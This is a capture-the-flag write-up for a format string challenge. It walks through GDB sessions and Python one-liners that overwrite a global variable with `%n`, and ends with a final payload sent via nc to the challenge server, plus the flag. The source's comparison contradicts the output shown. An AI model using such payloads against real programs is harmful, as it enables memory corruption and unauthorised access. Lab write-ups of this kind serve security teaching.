# Global Warming

Author: [AJ1479](https://github.com/AJ1479)

## Description

String format exploit to overwrite global variable.

## Requirements

- Basic Knowledge of format string exploit.
- Docker: [Dockerfile](./Dockerfile)

## Sources

- [global-warming](./bin/global-warming): Binary

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int admin = 0;

void login(char username[10], char *pass)
{

	printf(pass);
	if (admin != 0xb4dbabe3)
	{
		system("cat flag.txt");
	}
	else
	{
		printf("You cannot login as admin.");
	}
}

int main()
{
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);

	char pass[1024];
	fgets(pass, sizeof(pass), stdin);

	login("User", pass);
}
```

```
Greta Thunberg 1 Administration 0
```

## Exploit

The program has a global variable `admin`, the value of which needs to be changed. Looking at the program we see a printf statement, printing our input in `fgets`. Here, we need to use the format string exploit. We use `%x` as the format string input which returns values from the stack. We're also going to use the `%n` which writes the number of characters before the `%n` to the address just above(before) it in the stack. Also, memory addresses of global variables are stored in can be easily read from the `objdump` of the binary.
<br />

Using `objdump -t` you can get the address of `admin`.

```bash
$ objdump -t ./global-warming | grep admin
0804c02c g     O .bss   00000004              admin
```

Now, we need to write stuff to this location. Let's print some arbitrary value with a couple of `%x`s and see where it lands on the stack.

```bash
$ python2 -c "print 'AAAABBBBCCCC' + '%x ' * 30" | ./global-warming
AAAABBBBCCCCf7fc7a34 fbad2087 80491b2 f7f7ce24 804c000 ffd7d7a8 8049297 804a030 ffd7d3a0 f7f7d540 8049219 41414141 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
You cannot login as admin.%  
```

You know that `AAAABBBBCCCC` is going to become `41414141 42424242 43434343` in the binary, since `A` in hex is 41. You find that in the 12th position. You can now make it print just the value in the 12th position on the stack using `%12$x`.

```bash
$ python2 -c "print 'AAAABBBBCCCC' + '%12\$x ' * 30" | ./global-warming
AAAABBBBCCCC41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 
You cannot login as admin.% 
```

That works! Now we need to replace `AAAA` with the address of `admin`. We can test this directly on GDB, set a breakpoint after the `printf` call. Then we'll use `%12$n` to write to the address of `admin`. (Read up about `%n`). First we set up a breakpoint and define a hook-stop.

```bash
Breakpoint 1 at 0x80491c3
gdb-peda$ define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/x 0x0804c02c
>end
```

Now, we can run the program with the following input:

```bash
gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '%12\$x ' + '%12\$n'")Starting program: /home/roerohan/Documents/Repos/CSI/ctf-challenges/pwn/Global Warming/bin/global-warming < <(python2 -c "print '\x2c\xc0\x04\x08' + '%12\$x ' + '%12\$n'")
,804c02c 
0x804c02c <admin>:      0x0000000c
```

So, as you can see, this writes a really small value to the `admin` variable. Nice! Now we just need to add a huge padding, and  we can write the required value into that variable. Let's find out the padding you would need to include.

```python
>>> 0xb4dbabe3 - 0xc
3034295255
```

This number is HUGE, will take ages to print these many characters. We can instead make it possible with two smaller writes. First write the last 2 bits, then shift the address by 2 bits and write to that location. Smart. So we can first store the address (after adding 2) on the stack as well, so that we can refer to it using the `%13$n` syntax.

```bash
gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$x ' + '%12\$n'")
Starting program: /home/roerohan/Documents/Repos/CSI/ctf-challenges/pwn/Global Warming/bin/global-warming < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$x ' + '%12\$n'")
,.804c02c 
0x804c02c <admin>:      0x00000010
```

Cool! Now we have both the values on the stack. We can reference `0x0804c02e` by doing `%13$x` and `0x0804c02e` by doing `%12$x`. Let's write to the first half of `admin` first. You can see that `0x00000010` is already written. Which means we need to write `0xabe3 - 10 + 1` characters to make it `0000abe3`. Let's test that!

```bash
gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n'")
Starting program: /home/roerohan/Documents/Repos/CSI/ctf-challenges/pwn/Global Warming/bin/global-warming < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n'")
,. 
...
804c02c 
0x804c02c <admin>:      0x0000abe3                                       
```

That worked! Now let's see what happens when we write to `%13\$n`.

```bash
gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n' + '%13\$x' + '%13\$n'")

804c02c 804c02e
0x804c02c <admin>:      0xabeaabe3
```

So, it writes `abea` in the first half. We need it to be `b4db`. So we need to write atleast `b4db - 0xabea` characters.

```bash
gdb-peda$ r < <(python2 -c "print '\x2c\xc0\x04\x08' + '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n' + '%13\$2289x' + '%13\$n'")
...
0x804c02c <admin>:      0xb4d4abe3
```

Close! Now just adjust the offset to make it `b4db`. You get the offset as `2295`characters. This is going to be our final payload.

```bash
$ (python2 -c "print '\x2c\xc0\x04\x08' +  '\x2e\xc0\x04\x08' + '%12\$43994x ' + '%12\$n ' + '%13\$2295x' + '%13\$n'"; cat) | nc chall.csivit.com 30023
...
...
804c02e
csictf{n0_5tr1ng5_@tt@ch3d}
```

The flag is:

```
csictf{n0_5tr1ng5_@tt@ch3d}
```